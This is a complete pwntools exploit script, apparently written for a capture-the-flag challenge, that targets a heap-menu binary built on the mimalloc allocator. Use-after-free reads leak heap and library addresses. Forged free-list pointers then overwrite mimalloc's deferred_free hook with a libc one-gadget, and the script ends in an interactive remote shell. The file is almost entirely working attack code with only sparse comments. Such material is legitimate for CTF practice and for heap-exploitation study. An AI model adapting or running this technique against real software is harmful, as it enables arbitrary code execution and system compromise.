#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'neww']
#r = process('./mi')
r = remote('mi.chal.ctf.westerns.tokyo', 10001)
libc = ELF('./libc.so.6')
#libmi = ELF('./mimalloc/out/check/libmimalloc.so')
libmi = ELF('./libmimalloc.so')


def create(idx, size):
    r.sendlineafter('>>\n', '1')
    r.sendlineafter('number\n', str(idx))
    r.sendlineafter('size\n', str(size))

def write(idx, s):
    r.sendlineafter('>>\n', '2')
    r.sendlineafter('number\n', str(idx))
    r.sendafter('value\n', s)

def read(idx):
    r.sendlineafter('>>\n', '3')
    r.sendlineafter('number\n', str(idx))

def delete(idx):
    r.sendlineafter('>>\n', '4')
    r.sendlineafter('number\n', str(idx))

# detach all free chunk in free list
for _ in range(0x80-7):
    create(4, 0x20)

create(0, 0x20)
create(1, 0x20)
create(3, 0x20)
create(4, 0x20)
create(5, 0x20)
create(6, 0x20)
create(7, 0x20)

delete(0)
delete(1)

read(1)

leak = u64(r.recvn(6).ljust(8, '\0')) - 0x25a0
heap_offset = leak + 0xa8
local_free_offset = leak + 0x88
memid_offset = leak + 0x48
page_shift_offset = leak + 0x50
print 'miheap:', hex(leak)

# we cannot fake chunk at &page->heap directly because of the test below, fake &page->local_free instead
# mi_assert_internal(page->free == NULL || _mi_ptr_page(page->free) == page); (page->free must be valid)
write(1, p64(local_free_offset).ljust(0x20))

create(1, 0x20)
create(2, 0x20)
write(2, 'A'*0x20)
read(2)

r.recvuntil('A'*0x20)
mi_base = u64(r.recvn(6).ljust(8, '\0')) - 0x2233c0
libmi.address = mi_base
libc.address = mi_base + 0x22a000

print 'libmi base:', hex(mi_base)

write(2, flat(
    0, 0, 0, 0x20
))


# abusing free list concatenation to write deferred_free hook
# fake &deferred_free as the last chunk in thread_free
# after concatnation: -> thread_free -> free(NULL) -> local_free
delete(4)
delete(3) #ptr
ptr = leak + 0x25e0

free_hook = libmi.symbols['deferred_free']
write(4, p64(free_hook).ljust(0x20))

# write ptr to page->thread_free
magic = libc.address + 0x10a38c # 0x4f2c5,0x4f322
write(2, flat(
    magic, 2, ptr, 0x20
))

# trigger free list concatenation
create(0, 0x20)

# make page->free == NULL after allocation
write(4, '\0'*0x20)
create(0, 0x20)

# trigger deferred_free hook 
create(0, 0x20)

r.interactive('> ')
